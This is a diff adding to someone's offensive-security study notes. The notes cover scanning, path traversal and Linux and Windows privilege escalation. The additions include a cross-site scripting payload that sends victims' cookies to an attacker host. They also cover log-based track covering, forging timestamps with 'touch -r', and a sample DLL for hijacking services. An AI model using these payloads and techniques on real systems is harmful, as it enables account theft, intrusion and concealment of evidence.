@@ -26,6 +26,9 @@ SCANNING AND RECON
             nc -v <ip> <port> #banner grab
             nmap -sV <ip> <port>
             nikto -h <ip> -p <port> #open source vuln scan
+            
+
+            nmap -sC <host>     #scans host with all scripts (works over proxychains too)
 
     NMAP scripting engine (NSE) #/usr/share/nmap/scripts/
         nmap --script http-enum.nse <ip> #basic enumeration
@@ -34,9 +37,10 @@ SCANNING AND RECON
 
     Web Server Recon
         Nikto
+            nikto -h <ip> -p 80     #lists lots of directories
         bannergrab w/ nc/nmap
         nmap nse scripts:
-            http-enum
+            http-enum   #search for directories
                 nmap -Pn -T5 -sT -p 80 --script http-enum.nse <IP>
             http-sql-injection
                 nmap -Pn -T5 -sT -p 80 --script http-sql-inection.nse <IP>
@@ -78,6 +82,10 @@ WEB EXPLOITATION - look for robots.txt
         uses ../../  paths
         ex.     ../../../../../../../etc/passwd
         
+
+    Steal Cookies
+        <script>document.location="http://<attacker ip>:<random port>/cgi-bin/grab.cgi?"+document.cookie;</script>  #quotes may need to be '
+
 SQL 
 
     Table - entity
@@ -213,8 +221,221 @@ Reverse Engineering
                 follow 
 
 
+POST EXPLOITATION
+    Questions to ask:
+        Who's logged in?
+        Who am I?
+
+        Networking
+            IP, DNS, ARP Tables, Ports
+            Hosts file (Static FQDN to IP, made by a human)
+        
+        Processes
+            Tasks/CRON
+            Services/Daemons
+            User Run Processes
+            
+            Configurations (/etc)
+
+        Logs
+            Text 
+                *.evtx (on disk) for windows
+                /var/log/*.log for linux
+                /etc/rsyslog.d/
+            Binary
+                journald for linux
+                *.evtx (in memory) for windows
+
+    Timestamps:
+       M - modify (change data w/in file)
+       A - reading (accessing) file contents
+       C - change meta data
 
 
+    Accessing Objects       Subject --> OS --> Object
+                            UserID     Linux
+                            SACL     Windows
+
+find / -name "*.txt" 2> /dev/null | less
+
+
+
+LINUX PRIVELEGE ESCALATION
+    Sudo -l
+        list of commands that can be used as root
+        https://gtfobins.github.io/
+    Determine current user level:
+        id, whoami, (# $), echo $PS1, visudo
+
+    SUID - set user ID bit
+        rwsrwxrwx   - runs as owner of the file
+        chmod 4777
+    SGID - set group ID bit
+        rwxrwsrwx   - runs as group that created file
+        chmod 2777
+
+    search for files with sgid/suid bit set
+        find / -type f -perm /2000
+        find / -type f -perm /4000
+        find / -type f -perm /6000 #both
+        
+    Find Directories with world writable perms
+        find / -type f -perm /2 -o -type d -perm /2 2>/dev/null
+        find / -type f -writable -o -type d -writable 2>/dev/null #anything I can write to
+
+    run file on each exe, check hash, check permissions
+        some files will check the real user ID, even if file is run as root
+        find binaries that arent
+
+    Cron
+        check if you can modify cron job scripts (is it in /temp?)
+        /etc/crontab
+
+        /etc/cron.d/     - run whenever its told to
+        
+        find /var/spool/cron/crontabs /etc/cron* -writable -ls  #find all crons that you can modify
+
+    Kernel vulnerabilities 
+        uname -a, google
+
+    Boot Process Persistence
+        /etc/rc5.d
+    
+    Find INIT type
+        ls -latr /proc/1/exe
+        stat /sbin/init
+        man init
+        init --version
+        ps 1
+
+    Audit SYSTEMV - uses journalctl
+        ausearch    - pulls from audit.log
+
+        Covering tracks logs 
+            lastlog --- each users successful login time
+
+            btmp --- tracks bad login attempts
+
+            secure --- Syslog
+
+            sulog --- use of su command
+
+            utmp --- users currently on (w)
+
+            wtmp --- permanent record on user on/off
+
+            auth.log/secure --- tracks usage of authorization
+    
+    last - last users logged in
+
+    touch -r file1.txt file2.txt   #change file1's timestamp to file2's
+
+    Logging Remote (rsyslog port 514)
+        take note of uncommented lines
+        <facility>.<priority>
+
+
+
+WINDOWS PRIVILEGE ESCALATION (changing AT or DACL)
+    Windows Access Control:
+        Subjects --> Permissions --> Objects
+        
+        Permissions #Subjects have ATs, Objects have DACLs
+            Access Token - unique value attached to every user session (subject)
+                defines Groups, User SID
+            Discretionary Access Control List (DACL) - objects have these
+                defines WHAT may access the object
+
+            ACE (Access Control Entry) # AT and DACL define ACE
+                combined AT and DACL
+
+    Windows Boot Process
+        Csrss.exe
+            csrss.exe[0]    #owned by LocalSystem
+                services.exe
+                    svchost
+                    svchost
+            csrss.exe[1]    #user stuff (who your're logged in as)
+                winlogon
+                    logonui....
+                        explorer
+
+
+
+    localsystem - highest privilileged user account
+
+    Localsystem --> Permissions --> Registry
+    
+        Registry - Run as whoever reads the data (registry is the object)
+            Tasks and Services are stored in registry, read by LocalSystem (Subject)
+
+            User (Subject) only has access to HKCU
+                HKLM - Read only by users
+                HKCU - Read, Write by users. derived from HKLM.
+
+        Tasks- Run as LocalSystem (Subject)
+            User's access:
+                Read
+                Write
+        Services - Run as LocalSystem (Subject)
+            User's Access
+                Read
+
+    
+    Commands
+        sc query   - display services, accesses the registry
+            reg query HKLM\SYSTEM\CurrentControlSet\Services #LocalSystem executes the services found here
+        icacls <directory>   # display ACE (Access Control Entry) get permissions for a directory
+            R - read
+            W - Write....
+            CI - Container Inherit
+            OI - Object Inherit
+        Powershell scripts:
+            Get all services where caption/pathname doesn't contain windows
+                Get-WmiObject win32_service | where { $_.Caption -notmatch "Windows" -and $_.PathName -notmatch "Windows" }
+
+    SVCHOST - load dll from path in registry key
+        reg query HKLM\SYSTEM\CurrentControlSet\Services\XboxGibSvc
+            DisplayName is the dll that is loaded
+                
+    Since Services are run as LocalSystem, if the service binary is modifiable by you (standard user), you can replace binary and get LocalSystem access
+
+    Process Execution Steps
+        putty.exe
+            Into Memory
+                Load DLLs from:
+                    1.) Present Directory of EXE
+                    2.) DLL Location Key
+                    5.) Current Directory of the calling EXE
+
+   to compile to dll: sudo apt install g++-mingw-w64-i686
+   Example DLL: 
+         * i686-w64-mingw32-g++ -c -D example.dll simple.c -o simple.o
+         * i686-w64-mingw32-g++ -shared -o simple.dll simple.o  -Wl,--out-implib,simple.a
+         */
+        #include <windows.h>
+        int execCommand()
+        {
+         WinExec("cmd /C whoami > C:/Users/DemoAdmin/Desktop/WhatsGood.txt", 1);
+         WinExec("cmd /C whoami > FINDME_1.txt", 1);
+         WinExec("whoami > FINDME_2.txt", 1);
+
+         return 0;
+        }
+        BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
+        {
+         execCommand();
+         return 0;
+        }
+
+    
+    SCHTASKS - is able to run tasks as any user
+        is the binary being scheduled in a non \Windows directory?
+            can overwrite it with malicious binary?
+
+
+
+        
 
 
 
